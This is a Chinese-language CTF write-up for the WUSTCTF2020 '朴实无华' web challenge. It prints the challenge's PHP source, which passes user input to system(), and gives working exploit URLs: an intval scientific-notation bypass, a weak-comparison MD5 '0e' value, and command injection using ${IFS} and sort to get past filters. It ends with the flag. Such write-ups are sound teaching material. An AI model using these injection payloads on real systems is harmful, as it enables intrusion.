# [WUSTCTF2020]朴实无华

[题目地址](https://buuoj.cn/challenges#[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E)

周围的空气突然就枯燥起来了。

进来啥也没有，空空如也的页面。扫了一下目录，结果漏扫了robots.txt，还要自己手动去看。提示了`/fAke_f1agggg.php`文件，去看了后确实有个假flag。我要假flag干什么，开发者工具看看有没有什么提示。最后在Network选项记录的服务器回包中看见了猫腻。

```
Connection: keep-alive
Content-Length: 22
Content-Type: text/html
Date: Sat, 26 Nov 2022 03:48:52 GMT
Look_at_me: /fl4g.php
Server: openresty
X-Powered-By: PHP/5.5.38
```

继续去/fl4g.php看看。

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

chrome默认打开是乱码，需要将[编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)改成unicode。第一关，要求传入参数num的intval小于2020，加上1后却大于2021。这里的考点在于intval会截断科学计数法下的字符串，但当以科学计数法表示的字符串进行运算后便不会截断，会返回其运算后的值。测试时php7这个特性就消失了，然而环境下是5.5.38，因此构造payload。

- http://072b1d9e-2afa-4d8c-9cc4-4b184d218d15.node4.buuoj.cn:81/fl4g.php?num=1e4

第二关要求传入的字符串等于其md5值。由于是弱比较，所以我们找一个0e开头且其md5值也是0e开头的字符串就好了。[wp](https://blog.csdn.net/weixin_44037296/article/details/111220371)里找到一个`0e215962017`。于是payload：

- http://072b1d9e-2afa-4d8c-9cc4-4b184d218d15.node4.buuoj.cn:81/fl4g.php?num=1e4&md5=0e215962017

最后一关简单的命令执行绕过。空格不给用就用${IFS}，cat不给用就用sort或者别的，姿势可多了。首先ls得知flag名字，然后一把梭。

- http://072b1d9e-2afa-4d8c-9cc4-4b184d218d15.node4.buuoj.cn:81/fl4g.php?num=1e4&md5=0e215962017&get_flag=sort${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag

## Flag
> flag{6c81013c-296e-4949-bf83-10ae77478abe}